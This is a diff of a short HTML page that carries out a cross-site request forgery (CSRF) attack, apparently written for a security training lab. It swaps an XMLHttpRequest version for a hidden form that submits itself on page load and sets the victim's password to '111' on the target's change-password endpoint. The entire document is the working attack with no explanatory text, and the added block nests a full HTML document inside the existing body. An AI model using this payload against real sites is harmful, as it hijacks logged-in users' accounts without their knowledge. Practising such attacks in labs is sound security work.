@@ -11,14 +11,27 @@
 
 <h1>This is CSRF attack</h1>
   
-    <script>
-        var xhttp = new XMLHttpRequest();
-        xhttp.open("POST", "https://p18onhgcwj.voorivex-lab.online/change-password");
-        xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        xhttp.withCredentials = true;
-        var password = "111";
-        xhttp.send("newPassword=" + encodeURIComponent(password));
-    </script>
+    <!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF test</title>
+</head>
+<body>
+  <h1>CSRF test page</h1>
+
+  <form id="csrfForm"
+        action="https://p18onhgcwj.voorivex-lab.online/change-password"
+        method="POST">
+    <input type="hidden" name="newPassword" value="111">
+  </form>
+
+  <script>
+    document.getElementById("csrfForm").submit();
+  </script>
+</body>
+</html>
+
 </body>
 
 </html>
